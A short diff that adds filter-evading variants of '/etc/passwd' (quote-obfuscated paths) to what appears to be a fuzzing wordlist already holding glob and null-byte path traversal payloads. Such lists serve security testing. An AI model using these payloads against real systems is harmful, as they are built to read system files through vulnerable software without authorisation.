@@ -1,4 +1,7 @@
 /???/??ss??
+/e't'c/p'a's's'w'd'
+/e'tc'/pa'ss'wd
+/e'tc'/pa'ss'wd
 
 %00../../../../../../etc/passwd
 %00/etc/passwd%00
